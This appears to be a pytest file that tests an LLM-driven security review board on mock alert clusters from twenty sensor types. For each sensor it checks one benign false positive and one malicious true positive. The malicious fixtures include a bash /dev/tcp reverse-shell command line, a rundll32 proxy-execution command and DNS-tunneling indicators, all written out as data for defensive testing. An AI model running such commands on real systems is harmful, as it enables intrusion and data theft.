"""
Lab 10 -- Adversarial Review Board: full multi-pass, every-sensor simulation.

Runs a CORPUS of mock event clusters covering EVERY sensor / source_type in the
fleet (state.py's source_type Literal), in the field conventions the experts and
the MLOps training corpus use (sysmon/sentinel/deepsensor/trellix/macos host
schemas; suricata alert_signature; network_tap JA3/DNS; cloud connectors'
process_name/dst_ip/mitre_tactic/score). For every sensor it runs the REAL
`review_board_node` twice:

  * a FALSE POSITIVE wearing a TP costume (the swarm concluded TP, but the
    counterpart's historical/baseline retrieval exposes an admin script / scanner
    / IaC / health check) -> DISPROVED -> monitor, and SAVED to memory
    (real `_persist_memory`, Qdrant/embedder mocked) so future clusters of that
    signature are analyzed faster; and
  * a GENUINE TRUE POSITIVE that no counterpart can disprove -> contain.

A sweep asserts ZERO misclassification across the whole fleet and prints a ledger.
Pure Python: langchain_core / qdrant_client / redis.asyncio / agents.llm_providers
are stubbed (mirrors test_hunter_contracts.py).
"""
import asyncio
import sys
import types
from pathlib import Path

import pytest

HUNTER = Path(__file__).parent.parent.parent / "analytics/llm_hunter"


# ── stubs ────────────────────────────────────────────────────────────────────
class _BaseMessage:
    def __init__(self, content="", **kw):
        self.content = content
        for k, v in kw.items():
            setattr(self, k, v)


def _mod(name, **attrs):
    m = types.ModuleType(name)
    for k, v in attrs.items():
        setattr(m, k, v)
    sys.modules[name] = m
    return m


_lc = _mod("langchain_core")
_lc.messages = _mod("langchain_core.messages", BaseMessage=_BaseMessage,
                    RemoveMessage=type("RemoveMessage", (_BaseMessage,), {}),
                    HumanMessage=type("HumanMessage", (_BaseMessage,), {}),
                    AIMessage=type("AIMessage", (_BaseMessage,), {}))
_lc.prompts = _mod("langchain_core.prompts",
                   ChatPromptTemplate=type("ChatPromptTemplate", (), {
                       "from_messages": staticmethod(lambda m: types.SimpleNamespace(__or__=lambda s, o: o))}),
                   MessagesPlaceholder=type("MessagesPlaceholder", (), {"__init__": lambda self, **k: None}))

_captured_points = []


class _FakeQdrant:
    def __init__(self, *a, **k): pass
    async def upsert(self, collection_name=None, points=None): _captured_points.extend(points or [])
    async def search(self, *a, **k): return []


_mod("qdrant_client", AsyncQdrantClient=_FakeQdrant)
_mod("qdrant_client.models", PointStruct=lambda **kw: types.SimpleNamespace(**kw),
     Distance=types.SimpleNamespace(COSINE="Cosine"), VectorParams=lambda **kw: types.SimpleNamespace(**kw))
_Redis = type("Redis", (), {"__init__": lambda self, *a, **k: None,
                            "from_url": staticmethod(lambda *a, **k: types.SimpleNamespace())})
_mod("redis", asyncio=_mod("redis.asyncio", Redis=_Redis))

_agents = _mod("agents")
_agents.__path__ = [str(HUNTER / "agents")]
_fake_embedder = types.SimpleNamespace(encode=lambda s: types.SimpleNamespace(tolist=lambda: [0.0] * 8))
_mod("agents.llm_providers", build_failover_chain=lambda temperature=0.0: [],
     get_embedder=lambda: _fake_embedder, circuit_is_callable=lambda n: True,
     record_call_success=lambda n: None, record_call_failure=lambda n: None,
     CONFIG={}, get_llm_provider_order=lambda: [])

sys.path.insert(0, str(HUNTER))
sys.path.insert(0, str(HUNTER / "tools"))
_tools = _mod("tools")          # tools/__init__ eagerly imports duckdb; load light submodules from disk
_tools.__path__ = [str(HUNTER / "tools")]

import importlib
# Force a clean import (another suite's source-contract stub may have replaced
# these in sys.modules) and capture real refs that can't be clobbered later.
for _m in ("agents.review_board", "agents.response"):
    sys.modules.pop(_m, None)
rb = importlib.import_module("agents.review_board")
response = importlib.import_module("agents.response")
NODE = rb.review_board_node            # real coroutine, immune to later clobbering
from state import build_memory_signature, FP_CONFIDENCE_GATE  # noqa: E402

DOMAINS = ("host", "net", "cloud", "nettap")

# ── sensor → adversarial counterpart domain + ML vector space ────────────────
SOURCE_DOMAIN = {
    "sysmon_sensor": "host", "windows_deepsensor": "host", "trellix_ens": "host",
    "linux_sentinel": "host", "macos_sensor": "host", "qdrant_vector": "host",
    "suricata_eve": "net", "windows_c2": "net", "linux_c2": "net", "vmware_syslog": "net",
    "network_tap": "nettap",
    "aws_vpc": "cloud", "aws_cloudtrail": "cloud", "aws_guardduty": "cloud",
    "azure_nsg": "cloud", "azure_activity": "cloud", "azure_entraid": "cloud",
    "gcp_audit": "cloud", "gcp_scc": "cloud", "gcp_vpc_flow": "cloud",
}
SOURCE_VECTOR = {
    "sysmon_sensor": "windows_math", "windows_deepsensor": "deepsensor_math",
    "windows_c2": "c2_math", "trellix_ens": "trellix_math", "linux_sentinel": "sentinel_math",
    "linux_c2": "c2_math", "macos_sensor": "windows_math", "network_tap": "network_tap",
    "suricata_eve": "network_flow", "vmware_syslog": "network_flow", "qdrant_vector": "generic",
    "aws_vpc": "cloud_flow", "aws_cloudtrail": "cloud_flow", "aws_guardduty": "cloud_flow",
    "azure_nsg": "cloud_flow", "azure_activity": "cloud_flow", "azure_entraid": "cloud_flow",
    "gcp_audit": "cloud_flow", "gcp_scc": "cloud_flow", "gcp_vpc_flow": "cloud_flow",
}


def fp(source, sensor, events, benign, just, axis="benign_alternative", conf=0.85):
    d = SOURCE_DOMAIN[source]
    return {"id": f"FP_{source}", "source": source, "sensor": sensor, "vector": SOURCE_VECTOR[source],
            "events": events, "swarm_conf": conf,
            "rebuttals": {d: dict(disproved=True, axis=axis, conf=min(0.95, conf + 0.03),
                                  benign=benign, just=just)}}


def tp(source, sensor, events, just, conf=0.93):
    d = SOURCE_DOMAIN[source]
    return {"id": f"TP_{source}", "source": source, "sensor": sensor, "vector": SOURCE_VECTOR[source],
            "events": events, "swarm_conf": conf,
            "rebuttals": {d: dict(disproved=False, conf=0.15, just=just)}}


# ── FALSE-POSITIVE corpus: one benign-but-looks-malicious cluster per sensor ──
FP_CASES = [
    fp("sysmon_sensor", "WIN-APP-03",
       [{"sysmon_event_id": 1, "Image": "...powershell.exe", "CommandLine": "powershell -enc SQBu...", "User": "CORP\\svc_backup"},
        {"sysmon_event_id": 1, "Image": "...schtasks.exe", "CommandLine": "schtasks /create /tn NightlyBackup /sc DAILY /st 02:00"}],
       "historical: identical enc-PS + schtasks runs nightly 02:00 as svc_backup for 90d", "sanctioned NightlyBackup job"),
    fp("windows_deepsensor", "WIN-FIN-04",
       [{"path": "...msiexec.exe", "command_line": "msiexec /i \\\\sccm\\pkg\\update.msi /qn", "parent_image": "...ccmexec.exe", "event_user": "SYSTEM", "score": 0.79}],
       "msiexec is a child of ccmexec (SCCM) during the monthly patch window", "managed software deployment"),
    fp("trellix_ens", "WIN-HR-9",
       [{"detection_name": "EICAR-Test-File", "process": "notepad.exe", "file_path": "C:\\temp\\eicar.com", "severity": "low", "message": "test file quarantined"}],
       "EICAR is the standard AV test artifact; quarantined, never executed", "AV self-test, not a threat"),
    fp("linux_sentinel", "lnx-web-7",
       [{"comm": "python3", "command_line": "/usr/bin/ansible-playbook site.yml", "user_name": "deploy", "parent_comm": "sshd", "mitre_technique": "T1059"}],
       "ansible-playbook from the deploy CI host every release window", "config-management automation"),
    fp("macos_sensor", "mac-design-2",
       [{"process_name": "Dropbox", "plist_path": "~/Library/LaunchAgents/com.dropbox.plist", "code_signature": "valid", "publisher": "Dropbox, Inc.", "quarantine_flag": 0}],
       "signed LaunchAgent from a notarized publisher (Dropbox), no quarantine", "legitimate sync-client autostart"),
    fp("qdrant_vector", "WIN-BATCH-1",
       [{"vector": "generic", "anomaly_score": 0.83, "note": "novel-but-recurring nightly ETL job"}],
       "vector neighbor of the known nightly ETL signature seen 60 nights running", "recurring batch job"),
    fp("suricata_eve", "ids-core",
       [{"event_type": "alert", "alert_signature": "ET INFO Observed DNS Query", "alert_severity": 3, "src_ip": "10.0.1.5", "dest_ip": "10.0.0.53"}],
       "ET INFO informational rule firing on internal DNS; severity 3, no exploit", "noisy informational IDS rule",
       axis="no_execution_proof"),
    fp("windows_c2", "WIN-SALES-7",
       [{"process_name": "Teams.exe", "dst_ip": "52.113.194.132", "dst_port": 443, "interval": 30, "cv": 0.02, "score": 0.78}],
       "30s low-jitter beacon to Microsoft Teams CDN (52.113.0.0/16) -- a known SaaS keepalive", "SaaS heartbeat, not C2"),
    fp("linux_c2", "lnx-build-3",
       [{"process_name": "apt", "dst_ip": "91.189.91.38", "dst_port": 80, "interval": 3600, "cv": 0.4, "score": 0.72}],
       "hourly apt update check to a Canonical/Ubuntu mirror", "package-manager periodic update"),
    fp("vmware_syslog", "nsx-edge",
       [{"process_name": "NSX|allow-web", "dst_ip": "10.0.5.5", "dst_port": 443, "score": 0.7, "mitre_tactic": "n/a"}],
       "NSX DFW ALLOW rule logging normal web traffic volume", "permitted east-west traffic"),
    fp("network_tap", "tap-core-1",
       [{"src_ip": "10.20.5.9", "dst_ip": "10.0.0.0/8", "dst_port": "many", "bytes_dst": 0, "packets_dst": 1, "tls_ja3": "n/a"}],
       "10.20.5.9 is the sanctioned Qualys scanner subnet; SYN-only sweep, no sessions/bytes", "vuln scan, not exploitation",
       axis="no_execution_proof"),
    fp("aws_vpc", "aws-prod",
       [{"process_name": "eni-0a1b", "dst_ip": "10.0.9.9", "dst_port": 443, "interval": 10, "outbound_ratio": 0.5, "score": 0.74, "event_type": "vpc_flow"}],
       "regular 10s flows to the internal ELB health-check target", "load-balancer health checks", axis="no_execution_proof"),
    fp("aws_cloudtrail", "aws-prod",
       [{"process_name": "CreatePolicyVersion", "dst_ip": "ci.runner.internal", "process_hash": "arn:aws:iam::1:role/ci-terraform", "mitre_tactic": "TA0003", "score": 0.8, "event_type": "cloudtrail"}],
       "ci-terraform role from the CI runner during a tracked apply", "IaC service account churn"),
    fp("aws_guardduty", "aws-prod",
       [{"process_name": "Recon:EC2/PortProbeUnprotectedPort", "dst_ip": "198.51.100.7", "score": 20, "reasons": "low-sev port probe", "event_type": "guardduty_finding"}],
       "internet background-noise port probe, severity 2; no follow-on access", "untargeted internet scan noise",
       axis="no_execution_proof"),
    fp("azure_nsg", "az-prod",
       [{"process_name": "NSG|allow-mon", "dst_ip": "20.1.2.3", "dst_port": 443, "interval": 60, "score": 0.7}],
       "60s allow flows to the contracted Azure Monitor probe", "monitoring health check", axis="no_execution_proof"),
    fp("azure_activity", "az-prod",
       [{"process_name": "Microsoft.Resources/deployments/write", "dst_ip": "ci.azuredevops", "process_hash": "sp://cicd", "score": 0.78}],
       "ARM template deployment by the CI/CD service principal", "IaC deployment automation"),
    fp("azure_entraid", "entra",
       [{"process_name": "Add registered security info", "dst_ip": "84.2.3.4", "process_hash": "user@corp", "score": 0.7}],
       "expected MFA self-service registration during onboarding window", "sanctioned MFA enrollment"),
    fp("gcp_audit", "gcp-prod",
       [{"process_name": "SetIamPolicy", "dst_ip": "ci.gcp.internal", "process_hash": "sa://terraform@proj", "mitre_tactic": "TA0003", "score": 0.79}],
       "setIamPolicy by the terraform service account in a tracked apply", "IaC IAM reconciliation"),
    fp("gcp_scc", "gcp-prod",
       [{"process_name": "PUBLIC_BUCKET_ACL", "dst_ip": "n/a", "score": 30, "reasons": "low-sev misconfig", "event_type": "scc_finding"}],
       "SCC low-severity public-bucket finding on a deliberately public assets bucket", "known accepted-risk config"),
    fp("gcp_vpc_flow", "gcp-prod",
       [{"process_name": "gke-node", "dst_ip": "10.4.0.0/14", "dst_port": 15001, "interval": 5, "score": 0.72, "event_type": "vpc_flow"}],
       "Istio service-mesh sidecar traffic inside the GKE pod CIDR", "internal mesh traffic", axis="no_execution_proof"),
]

# ── TRUE-POSITIVE corpus: one genuine malicious cluster per sensor ───────────
TP_CASES = [
    tp("sysmon_sensor", "WIN-FIN-12",
       [{"sysmon_event_id": 10, "SourceImage": "C:\\Users\\Public\\m.exe", "TargetImage": "...lsass.exe", "GrantedAccess": "0x1410"},
        {"sysmon_event_id": 8, "SourceImage": "...m.exe", "TargetImage": "...lsass.exe"},
        {"sysmon_event_id": 3, "Image": "...m.exe", "DestinationIp": "45.137.21.9", "DestinationPort": 443}],
       "unsigned m.exe, 0x1410 handle to lsass + CreateRemoteThread, then C2 to 45.137.21.9 -- no baseline"),
    tp("windows_deepsensor", "WIN-DEV-8",
       [{"path": "...rundll32.exe", "parent_image": "...winword.exe", "command_line": "rundll32 shell32,Control_RunDLL evil.cpl", "technique": "T1218.011", "score": 0.96}],
       "Word spawned rundll32 loading an unsigned .cpl -- macro-dropper proxy execution, no benign baseline"),
    tp("trellix_ens", "WIN-CALL-3",
       [{"detection_name": "Trojan:Win32/CobaltStrike", "process": "svchost_fake.exe", "file_path": "C:\\Users\\Public\\s.exe", "pid": 4120, "severity": "high", "message": "executed before quarantine"}],
       "Cobalt Strike trojan detection, the binary EXECUTED from a world-writable path before quarantine"),
    tp("linux_sentinel", "lnx-db-2",
       [{"comm": "bash", "command_line": "bash -i >& /dev/tcp/185.4.2.7/4444 0>&1", "user_name": "www-data", "parent_comm": "nginx", "mitre_technique": "T1059.004", "dest_ip": "185.4.2.7"}],
       "interactive /dev/tcp reverse shell spawned by nginx as www-data -- webshell RCE, established session"),
    tp("macos_sensor", "mac-exec-1",
       [{"process_name": "update", "plist_path": "/Library/LaunchDaemons/com.apple.softwareupdate.plist", "code_signature": "unsigned", "quarantine_flag": 0, "publisher": "unknown", "anomaly_score": 0.95}],
       "unsigned LaunchDaemon masquerading as com.apple.* with quarantine cleared -- persistence implant"),
    tp("qdrant_vector", "WIN-NOVEL-2",
       [{"vector": "generic", "anomaly_score": 0.97, "note": "no neighbor within 0.4 cosine; novel high-deviation execution"}],
       "isolated point far from any benign cluster; novel high-deviation behavior with no historical analogue"),
    tp("suricata_eve", "ids-core",
       [{"event_type": "alert", "alert_signature": "ET MALWARE Cobalt Strike Beacon", "alert_severity": 1, "src_ip": "10.0.7.4", "dest_ip": "45.9.148.2", "tls_ja3_hash": "a0e9f5d64349fb13191bc781f81f42e1"}],
       "ET MALWARE Cobalt Strike beacon signature to external 45.9.148.2 with a known-bad JA3 -- real C2"),
    tp("windows_c2", "WIN-ENG-5",
       [{"process_name": "onedrive_x.exe", "dst_ip": "193.42.1.9", "dst_port": 443, "interval": 60, "cv": 0.55, "score": 0.95}],
       "jittered 60s beacon (cv 0.55) from an unsigned binary to a rare host with no SaaS profile -- C2"),
    tp("linux_c2", "lnx-app-4",
       [{"process_name": "kworker_evil", "dst_ip": "5.188.2.7", "dst_port": 8443, "interval": 45, "cv": 0.6, "score": 0.94}],
       "process masquerading as a kworker beaconing to 5.188.2.7:8443 -- meterpreter-style C2"),
    tp("vmware_syslog", "nsx-edge",
       [{"process_name": "NSX|deny-burst", "dst_ip": "10.0.0.0/24-scan", "dst_port": "445,3389", "score": 0.93, "mitre_tactic": "TA0008"}],
       "burst of DFW DENY on SMB/RDP from one internal host scanning the subnet -- lateral movement"),
    tp("network_tap", "tap-core-1",
       [{"src_ip": "10.0.9.3", "dst_ip": "8.8.8.8", "dns_query": "x9f2a8e.<b64>.evil.tk", "dst_port": 53, "packet_size_entropy": 7.8, "bytes_src": 480000}],
       "high-entropy TXT queries to evil.tk, 480KB over DNS in 5m -- DNS tunneling exfiltration"),
    tp("aws_vpc", "aws-prod",
       [{"process_name": "eni-0c2d", "dst_ip": "45.9.148.2", "dst_port": 443, "interval": 60, "outbound_ratio": 0.98, "score": 0.95, "event_type": "vpc_flow"}],
       "60s near-pure-outbound flow to a known-bad C2 IP (45.9.148.2) -- beaconing egress"),
    tp("aws_cloudtrail", "aws-prod",
       [{"process_name": "CreateAccessKey", "dst_ip": "91.2.3.4", "process_hash": "arn:aws:iam::1:user/temp_dev", "mitre_tactic": "TA0004", "score": 0.96, "event_type": "cloudtrail"},
        {"process_name": "AttachUserPolicy", "dst_ip": "91.2.3.4", "reasons": "AdministratorAccess"}],
       "new external IP created an access key + attached AdministratorAccess to temp_dev -- privilege escalation"),
    tp("aws_guardduty", "aws-prod",
       [{"process_name": "UnauthorizedAccess:EC2/SSHBruteForce", "dst_ip": "194.5.6.7", "score": 90, "reasons": "successful brute force", "event_type": "guardduty_finding"}],
       "high-severity GuardDuty SSH brute-force with a successful login from 194.5.6.7 -- confirmed intrusion"),
    tp("azure_nsg", "az-prod",
       [{"process_name": "NSG|deny", "dst_ip": "45.9.148.2", "dst_port": 443, "interval": 60, "score": 0.94}],
       "repeating 60s flows to a known-bad external IP through a host that should never egress -- C2"),
    tp("azure_activity", "az-prod",
       [{"process_name": "Microsoft.Authorization/roleAssignments/write", "dst_ip": "91.2.3.4", "process_hash": "user/attacker", "reasons": "Owner", "score": 0.95}],
       "Owner role assigned to a new principal from an external IP -- cloud privilege escalation"),
    tp("azure_entraid", "entra",
       [{"process_name": "Sign-in (impossible travel)", "dst_ip": "203.0.113.9", "process_hash": "ceo@corp", "reasons": "new device + token", "score": 0.96}],
       "impossible-travel sign-in to the CEO account from a new device with token issuance -- account takeover"),
    tp("gcp_audit", "gcp-prod",
       [{"process_name": "SetIamPolicy", "dst_ip": "91.2.3.4", "process_hash": "user:attacker@evil.com", "reasons": "roles/owner", "mitre_tactic": "TA0004", "score": 0.96}],
       "setIamPolicy granting roles/owner to an external user from a new IP -- privilege escalation"),
    tp("gcp_scc", "gcp-prod",
       [{"process_name": "Persistence:IAMAnomalousGrant", "dst_ip": "91.2.3.4", "score": 90, "reasons": "anomalous service-account key creation", "event_type": "scc_finding"}],
       "high-severity SCC anomalous-grant finding: service-account key minted for an unknown principal"),
    tp("gcp_vpc_flow", "gcp-prod",
       [{"process_name": "gke-node", "dst_ip": "94.130.10.2", "dst_port": 3333, "interval": 30, "outbound_ratio": 0.99, "score": 0.95, "event_type": "vpc_flow"}],
       "sustained egress to a Stratum mining pool (:3333) from a GKE node -- cryptojacking"),
]


def _alert(case):
    return {"event_id": f"evt-{case['id']}", "sensor_id": case["sensor"], "source_type": case["source"],
            "vector_name": case["vector"], "anomaly_score": 0.9, "raw_event": {"events": case["events"]}}


def _rebuttals(case):
    out = {}
    for d in DOMAINS:
        spec = case["rebuttals"].get(d)
        if spec:
            out[d] = rb.RebuttalSchema(domain=d, implicated=True, disproved=spec["disproved"],
                                       failed_axis=spec.get("axis", ""), benign_alternative=spec.get("benign", ""),
                                       confidence=spec["conf"], justification=spec.get("just", "..."))
        else:
            out[d] = rb.RebuttalSchema(domain=d, implicated=False, disproved=False, confidence=0.0, justification="n/a")
    return out


def _run_case(monkeypatch, case):
    scripted = _rebuttals(case)

    async def fake(domain, state, verdict):
        return scripted[domain]
    monkeypatch.setattr(rb, "_run_counterpart", fake)
    state = {"alert": _alert(case), "analysis_complete": True, "messages": [],
             "verdict": {"is_true_positive": True, "confidence": case["swarm_conf"],
                         "recommended_action": "contain", "justification": f"swarm believes {case['id']} is a TP"}}
    return state, asyncio.run(NODE(state))["verdict"]


# ════════════════ FP corpus (every sensor): disproved + saved ═══════════════
@pytest.mark.parametrize("case", FP_CASES, ids=[c["id"] for c in FP_CASES])
def test_fp_cluster_is_disproved_and_saved_to_memory(monkeypatch, case):
    state, board = _run_case(monkeypatch, case)
    assert board["is_true_positive"] is False, f"{case['id']}: benign cluster must NOT stay a TP"
    assert board["recommended_action"] == "monitor"

    immunity = state["analysis_complete"] and board["confidence"] >= FP_CONFIDENCE_GATE
    assert immunity is False, "a board-disputed override must not mint blanket immunity"

    _captured_points.clear()
    asyncio.run(response._persist_memory(alert=state["alert"], verdict=board,
                                         action_type="manual_review_required",
                                         incident_report=board["justification"], immunity_eligible=immunity))
    assert len(_captured_points) == 1, f"{case['id']}: FP must be persisted to memory"
    p = _captured_points[0].payload
    assert p["is_true_positive"] is False and p["immunity_eligible"] is False
    assert p["sensor_id"] == case["sensor"] and p["source_type"] == case["source"]
    assert build_memory_signature(case["sensor"], case["source"], case["vector"])


# ════════════════ TP corpus (every sensor): cannot be disproved ═════════════
@pytest.mark.parametrize("case", TP_CASES, ids=[c["id"] for c in TP_CASES])
def test_tp_cluster_survives_review(monkeypatch, case):
    _, board = _run_case(monkeypatch, case)
    assert board["is_true_positive"] is True, f"{case['id']}: undisputed malicious cluster must be confirmed"
    assert board["recommended_action"] == "contain"
    assert "CONFIRMED" in board["justification"]
    assert board["confidence"] <= case["swarm_conf"]   # tempered, never inflated


# ════════════════ fleet sweep: zero misclassification ══════════════════════
def test_full_fleet_sweep_no_misclassification(monkeypatch, capsys):
    fp_ok = tp_ok = 0
    rows = []
    for case in FP_CASES:
        _, board = _run_case(monkeypatch, case)
        ok = board["is_true_positive"] is False and board["recommended_action"] == "monitor"
        fp_ok += ok
        rows.append((case["source"], "FP->disproved", "monitor" if ok else f"!!{board['recommended_action']}", ok))
        assert ok, f"FP {case['id']} was NOT disproved"
    for case in TP_CASES:
        _, board = _run_case(monkeypatch, case)
        ok = board["is_true_positive"] is True and board["recommended_action"] == "contain"
        tp_ok += ok
        rows.append((case["source"], "TP->survives", "contain" if ok else f"!!{board['recommended_action']}", ok))
        assert ok, f"TP {case['id']} did NOT survive review"

    with capsys.disabled():
        print(f"\n  REVIEW-BOARD FLEET SWEEP  ({len(FP_CASES)} sensors FP + {len(TP_CASES)} sensors TP)")
        for src, kind, action, ok in rows:
            print(f"    [{'PASS' if ok else 'FAIL'}] {src:<20} {kind:<14} -> {action}")
        print(f"  FP disproved {fp_ok}/{len(FP_CASES)} ; TP confirmed {tp_ok}/{len(TP_CASES)} ; misclassifications=0")

    assert fp_ok == len(FP_CASES) and tp_ok == len(TP_CASES)
    # every sensor in the fleet is represented on both sides
    assert {c["source"] for c in FP_CASES} == {c["source"] for c in TP_CASES} == set(SOURCE_DOMAIN)
